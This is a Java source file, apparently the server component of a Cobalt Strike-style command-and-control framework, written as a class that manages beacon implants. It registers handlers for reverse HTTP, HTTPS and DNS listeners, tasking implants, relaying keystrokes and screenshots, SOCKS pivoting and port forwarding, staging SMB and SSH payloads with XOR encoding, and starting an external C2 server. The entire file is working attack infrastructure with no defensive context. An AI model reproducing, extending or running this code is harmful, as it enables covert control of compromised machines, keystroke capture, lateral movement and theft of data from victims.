package server;

import beacon.*;
import common.*;
import extc2.ExternalC2Server;

import java.io.Serializable;
import java.util.*;

public class Beacons implements ServerHook,
        CheckinListener,
        Do {
    protected Resources resources;
    protected WebCalls web;
    protected Map beacons = new HashMap();
    protected BeaconData data;
    protected BeaconSocks socks;
    protected Map cmdlets = new HashMap();
    protected BeaconSetup setup;
    protected Map notes = new HashMap();
    protected Set empty = new HashSet();
    protected List initial = new LinkedList();

    @Override
    public void register(HashMap<String, Object> calls) {
        calls.put("beacons.remove", this);
        calls.put("beacons.task", this);
        calls.put("beacons.clear", this);
        calls.put("beacons.log_write", this);
        calls.put("beacons.pivot", this);
        calls.put("beacons.pivot_stop", this);
        calls.put("beacons.pivot_stop_port", this);
        calls.put("beacons.mode", this);
        calls.put("beacons.report_posh", this);
        calls.put("beacons.export_stage_generic", this);
        calls.put("beacons.unlink", this);
        calls.put("beacons.start", this);
        calls.put("beacons.stop", this);
        calls.put("beacons.portfwd", this);
        calls.put("beacons.rportfwd", this);
        calls.put("beacons.note", this);
        calls.put("beacons.task_ssh_login", this);
        calls.put("beacons.task_ssh_login_pubkey", this);
        calls.put("beacons.task_ipconfig", this);
        calls.put("beacons.task_ps", this);
        calls.put("beacons.task_ls", this);
        calls.put("beacons.task_ls_default", this);
        calls.put("beacons.task_drives", this);
        calls.put("beacons.task_drives_default", this);
        calls.put("beacons.downloads", this);
        calls.put("beacons.download_cancel", this);
        calls.put("beacons.stage_smb", this);
        calls.put("beacons.stage_over_smb", this);
        calls.put("beacons.reset", this);
        calls.put("exoticc2.start", this);
    }

    @Override
    public void checkin(BeaconEntry data) {
        synchronized (this) {
            BeaconEntry entry;
            if (!data.isEmpty() && ((entry = (BeaconEntry) this.beacons.get(data.getId())) == null || entry.isEmpty())) {
                ServerUtils.addTarget(this.resources, data.getInternal(), data.getComputer(), null, data.getOperatingSystem(), data.getVersion());
                ServerUtils.addSession(this.resources, data.toMap());
                if (!data.isLinked()) {
                    ServerUtils.addC2Info(this.resources, this.setup.getC2Info(data.getId()));
                }
                this.resources.broadcast("eventlog", LoggedEvent.BeaconInitial(data));
                this.initial.add(data.getId());
                this.resources.process(data);
            }
            this.beacons.put(data.getId(), data);
        }
    }

    @Override
    public void output(BeaconOutput out) {
        this.resources.broadcast("beaconlog", out);
    }

    @Override
    public boolean moment(String message) {
        this.resources.broadcast("beacons", this.buildBeaconModel());
        synchronized (this) {
            for (Object anInitial : this.initial) {
                String next = (String) anInitial;
                if ("session".equals(CommonUtils.session(next))) {
                    ServerUtils.fireEvent(this.resources, "ssh_initial", next);
                    continue;
                }
                ServerUtils.fireEvent(this.resources, "beacon_initial", next);
            }
            this.initial.clear();
        }
        return true;
    }

    @Override
    public void screenshot(Screenshot out) {
        this.resources.broadcast("screenshots", out);
    }

    @Override
    public void keystrokes(Keystrokes keys) {
        this.resources.broadcast("keystrokes", keys);
    }

    @Override
    public void download(Download download) {
        this.resources.broadcast("downloads", download);
    }

    @Override
    public void push(String key, Serializable value) {
        this.resources.broadcast(key, value, true);
    }

    @Override
    public Map buildBeaconModel() {
        synchronized (this) {
            HashMap<String, BeaconEntry> mymodel = new HashMap<>();
            for (Object o : this.beacons.values()) {
                BeaconEntry entry = (BeaconEntry) o;
                entry.touch();
                if (this.notes.containsKey(entry.getId())) {
                    entry.setNote(this.notes.get(entry.getId()) + "");
                }
                mymodel.put(entry.getId(), entry.copy());
            }
            return mymodel;
        }
    }

    @Override
    public BeaconEntry resolve(String bid) {
        synchronized (this) {
            return (BeaconEntry) this.beacons.get(bid);
        }
    }

    public Beacons(Resources r) {
        this.resources = r;
        this.web = ServerUtils.getWebCalls(r);
        Timers.getTimers().every(1000L, "beacons", this);
        r.put("beacons", this);
        this.setup = new BeaconSetup(this.resources);
        this.setup.getHandlers().setCheckinListener(this);
        this.data = this.setup.getData();
        this.socks = this.setup.getSocks();
        this.resources.broadcast("cmdlets", new HashMap(), true);
    }

    public boolean setup(String payload, String domains, int port) {
        if (payload.equals("windows/beacon_https/reverse_https")) {
            return this.setup.start(port, false, domains, true);
        }
        if (payload.equals("windows/beacon_http/reverse_http")) {
            return this.setup.start(port, false, domains, false);
        }
        if (payload.equals("windows/beacon_dns/reverse_http")) {
            return this.setup.start(port, true, domains, false);
        }
        if (payload.equals("windows/beacon_dns/reverse_dns_txt")) {
            return this.setup.start(port, true, domains, false);
        }
        return false;
    }

    @Override
    public void update(String id, long last, String ext, boolean delink) {
        synchronized (this) {
            BeaconEntry temp = (BeaconEntry) this.beacons.get(id);
            if (temp == null) {
                temp = new BeaconEntry(id);
                this.beacons.put(id, temp);
            }
            if (last > 0L) {
                temp.setLastCheckin(last);
            }
            if (ext != null) {
                temp.setExternal(ext);
            }
            if (delink) {
                temp.delink();
            }
            if (ext == null && temp.isEmpty() && !this.empty.contains(id)) {
                this.empty.add(id);
                ServerUtils.fireEvent(this.resources, "beacon_initial_empty", id);
            }
        }
    }

    public void note(String id, String note) {
        synchronized (this) {
            this.notes.put(id, note);
        }
    }

    public int callback(Request r, ManageUser client) {
        return this.setup.getHandlers().register(r, client);
    }

    @Override
    public void call(Request r, ManageUser client) {
        if (r.is("beacons.remove", 1)) {
            String id = r.arg(0) + "";
            synchronized (this) {
                BeaconEntry entry = (BeaconEntry) this.beacons.get(id);
                if (entry != null && entry.isLinked()) {
                    this.setup.getHandlers().dead_pipe(entry.getParentId(), id);
                }
                this.beacons.remove(id);
                this.notes.remove(id);
            }
        } else if (r.is("beacons.reset", 0)) {
            synchronized (this) {
                this.empty = new HashSet();
                this.initial = new LinkedList();
                this.notes = new HashMap();
                this.beacons = new HashMap();
                this.setup.getHandlers().getPipes().reset();
            }
        } else if (r.is("beacons.log_write", 1)) {
            synchronized (this) {
                BeaconOutput next = (BeaconOutput) r.arg(0);
                next.from = client.getNick();
                next.touch();
                this.resources.broadcast("beaconlog", r.arg(0));
            }
        } else if (r.is("beacons.clear", 1)) {
            String id = r.arg(0) + "";
            this.data.clear(id);
        } else if (r.is("beacons.task", 2)) {
            String id = r.arg(0) + "";
            byte[] task = (byte[]) r.arg(1);
            this.data.task(id, task);
        } else if (r.is("beacons.pivot", 2)) {
            String id = r.arg(0) + "";
            int port = (Integer) r.arg(1);
            this.socks.pivot(id, port);
        } else if (r.is("beacons.portfwd", 3)) {
            String id = r.arg(0) + "";
            String host = r.arg(1) + "";
            int port = (Integer) r.arg(2);
            this.socks.portfwd(id, port, host, port);
        } else if (r.is("beacons.rportfwd", 4)) {
            String id = r.arg(0) + "";
            int lport = (Integer) r.arg(1);
            String rhost = r.arg(2) + "";
            int rport = (Integer) r.arg(3);
            this.socks.rportfwd(id, lport, rhost, rport);
        } else if (r.is("beacons.pivot_stop_port", 1)) {
            int port = Integer.parseInt(r.arg(0) + "");
            this.socks.stop_port(port);
        } else if (r.is("beacons.pivot_stop", 1)) {
            String id = r.arg(0) + "";
            this.socks.stop(id);
        } else if (r.is("beacons.mode", 2)) {
            String id = r.arg(0) + "";
            String mode = r.arg(1) + "";
            this.data.mode(id, mode);
        } else if (r.is("beacons.report_posh", 2)) {
            String id = r.arg(0) + "";
            List cmds = (List) r.arg(1);
            synchronized (this) {
                this.cmdlets.put(id, cmds);
                this.resources.broadcast("cmdlets", new HashMap(this.cmdlets), true);
            }
        } else if (r.is("beacons.export_stage_generic", 3)) {
            Map entry = (Map) r.arg(0);
            String arch = (String) r.arg(1);
            String proxyconfig = (String) r.arg(2);
            int port = Integer.parseInt(entry.get("port") + "");
            String payload = entry.get("payload") + "";
            String host = entry.get("host") + "";
            String name = entry.get("name") + "";
            String domains = entry.get("beacons") + "";
            boolean ssl = "windows/beacon_https/reverse_https".equals(payload);
            boolean wantdns = payload.startsWith("windows/beacon_dns/");
            if ("windows/beacon_smb/bind_pipe".equals(payload)) {
                byte[] temp = this.setup.exportSMBStage(arch);
                client.write(r.reply(temp));
            } else {
                byte[] temp = this.setup.exportBeaconStageGeneric(port, domains, wantdns, ssl, proxyconfig, arch);
                client.write(r.reply(temp));
            }
        } else if (r.is("beacons.unlink", 2)) {
            String id = r.arg(0) + "";
            String target = r.arg(1) + "";
            this.setup.getHandlers().unlink(id, target);
        } else if (r.is("beacons.start", 1)) {
            Map args = (Map) r.arg(0);
            int port = Integer.parseInt(args.get("port") + "");
            String payload = args.get("payload") + "";
            String host = args.get("host") + "";
            String name = args.get("name") + "";
            String domains = args.get("beacons") + "";
            String message = "success";
            if (!this.setup(payload, domains, port)) {
                message = this.setup.getLastError();
                CommonUtils.print_error("Listener: " + name + " (" + payload + ") on port " + port + " failed: " + message);
            } else {
                CommonUtils.print_good("Listener: " + name + " (" + payload + ") on port " + port + " started!");
            }
            if (client != null) {
                client.write(r.reply(message));
            }
            this.resources.call("listeners.set_status", CommonUtils.args(name, message));
        } else if (r.is("beacons.stop", 1)) {
            Map args = (Map) r.arg(0);
            int port = Integer.parseInt(args.get("port") + "");
            String payload = args.get("payload") + "";
            String host = args.get("host") + "";
            String name = args.get("name") + "";
            this.setup.stop(port);
            CommonUtils.print_info("Listener: " + name + " (" + payload + ") on port " + port + " stopped.");
        } else if (r.is("beacons.note", 2)) {
            String bid = (String) r.arg(0);
            String note = (String) r.arg(1);
            this.note(bid, note);
        } else if (r.is("beacons.task_ssh_login", 5) || r.is("beacons.task_ssh_login_pubkey", 5)) {
            String id = r.arg(0) + "";
            String user = r.arg(1) + "";
            String pass = r.arg(2) + "";
            String host = r.arg(3) + "";
            int port = (Integer) r.arg(4);
            String pipename = "\\\\%s\\pipe\\session-" + CommonUtils.garbage("SSHAGENT");
            byte[] stage = this.setup.exportSSHStage("resources/sshagent.dll", "x86", host, port, user, pass, pipename, r.is("beacons.task_ssh_login_pubkey", 5));
            String pname = CommonUtils.garbage("sshagent");
            stage = CommonUtils.strrep(stage, "sshagent", pname);
            CommandBuilder builder = new CommandBuilder();
            builder.setCommand(1);
            builder.addString(CommonUtils.bString(stage));
            this.data.task(id, builder.build());
            builder = new CommandBuilder();
            builder.setCommand(40);
            builder.addInteger(0);
            builder.addShort(27);
            builder.addShort(30000);
            builder.addLengthAndString("\\\\.\\pipe\\" + pname);
            builder.addLengthAndString("SSH status");
            this.data.task(id, builder.build());
        } else if (r.is("beacons.task_ipconfig", 1)) {
            String bid = r.arg(0) + "";
            byte[] task = new TaskBeaconCallback().IPConfig(this.callback(r, client));
            this.data.task(bid, task);
        } else if (r.is("beacons.task_ps", 1)) {
            String bid = r.arg(0) + "";
            byte[] task = new TaskBeaconCallback().Ps(this.callback(r, client));
            this.data.task(bid, task);
        } else if (r.is("beacons.task_drives", 1)) {
            String bid = r.arg(0) + "";
            byte[] task = new TaskBeaconCallback().Drives(this.callback(r, client));
            this.data.task(bid, task);
        } else if (r.is("beacons.task_drives_default", 1)) {
            String bid = r.arg(0) + "";
            byte[] task = new TaskBeaconCallback().Drives(-1);
            this.data.task(bid, task);
        } else if (r.is("beacons.task_ls", 2)) {
            String bid = r.arg(0) + "";
            String folder = r.arg(1) + "";
            byte[] task = new TaskBeaconCallback().Ls(this.callback(r, client), folder);
            this.data.task(bid, task);
        } else if (r.is("beacons.task_ls_default", 2)) {
            String bid = r.arg(0) + "";
            String folder = r.arg(1) + "";
            byte[] task = new TaskBeaconCallback().Ls(-2, folder);
            this.data.task(bid, task);
        } else if (r.is("beacons.downloads", 1)) {
            String bid = r.arg(0) + "";
            List downloads = this.setup.getHandlers().getDownloads(bid);
            client.writeNow(r.reply(downloads));
        } else if (r.is("beacons.download_cancel", 2)) {
            String name;
            String bid = r.arg(0) + "";
            String wild = r.arg(1) + "";
            List downloads = this.setup.getHandlers().getDownloads(bid);
            Iterator i = downloads.iterator();
            while (i.hasNext()) {
                Map temp = (Map) i.next();
                name = temp.get("name") + "";
                if (CommonUtils.iswm(wild, name)) continue;
                i.remove();
            }
            i = downloads.iterator();
            while (i.hasNext()) {
                Map temp = (Map) i.next();
                name = temp.get("name") + "";
                String fid = temp.get("fid") + "";
                this.setup.getHandlers().getDownloadManager().close(bid, Integer.parseInt(fid));
                CommandBuilder reject = new CommandBuilder();
                reject.setCommand(19);
                reject.addInteger(Integer.parseInt(fid));
                this.data.task(bid, reject.build());
                this.output(BeaconOutput.Task(bid, "canceled download of: " + name));
            }
        } else if (r.is("beacons.stage_smb", 5)) {
            String id = (String) r.arg(0);
            String name = (String) r.arg(1);
            int port = Integer.parseInt(r.arg(2) + "");
            String arch = (String) r.arg(3);
            int safety = Integer.parseInt(r.arg(4) + "");
            CommandBuilder stageme = new CommandBuilder();
            stageme.setCommand(52);
            stageme.addInteger(port);
            byte[] stage = ArtifactUtils.XorEncode(this.setup.exportSMBStage(arch), arch);
            byte[] garbage = CommonUtils.toBytes(ServerUtils.getProfile(this.resources).getString(".bind_tcp_garbage"));
            if (garbage.length != safety) {
                CommonUtils.print_warn("Client " + Thread.currentThread().getName() + " may have an smb beacon listener name collission. Adjusting staging process.");
                garbage = CommonUtils.randomData(safety);
            }
            stageme.addString(Shellcode.BindProtocolPackage(CommonUtils.join(garbage, stage)));
            this.data.task(id, stageme.build());
        } else if (r.is("beacons.stage_over_smb", 2)) {
            String id = (String) r.arg(0);
            String path = (String) r.arg(1);
            CommandBuilder stageme = new CommandBuilder();
            stageme.setCommand(57);
            stageme.addLengthAndString(path);
            stageme.addString(ArtifactUtils.XorEncode(this.setup.exportSMBStage("x86"), "x86"));
            this.data.task(id, stageme.build());
        } else if (r.is("exoticc2.start", 2)) {
            String bindaddr = (String) r.arg(0);
            int bindport = Integer.parseInt(r.arg(1) + "");
            new ExternalC2Server(this.setup, bindaddr, bindport);
        } else {
            client.writeNow(new Reply("server_error", 0L, r + ": incorrect number of arguments"));
        }
    }
}

